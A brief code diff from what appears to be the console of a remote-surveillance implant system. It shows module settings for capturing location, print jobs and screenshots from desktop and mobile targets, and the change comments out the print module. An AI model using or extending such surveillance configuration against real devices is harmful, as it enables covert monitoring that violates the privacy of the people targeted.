@@ -82,7 +82,7 @@ package it.ht.rcs.console
 
 				{module: "position", gps: false, cell: true, wifi: true, _type: "desktop,mobile", _platform: "windows,osx,blackberry,winmo,symbian,android,ios,linux"},
 
-				{module: "print", quality: "med", _type: "desktop", _platform: "windows,linux"},
+				//{module: "print", quality: "med", _type: "desktop", _platform: "windows,linux"},
 
 				{module: "screenshot", onlywindow: false, quality: "med", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux"},
 
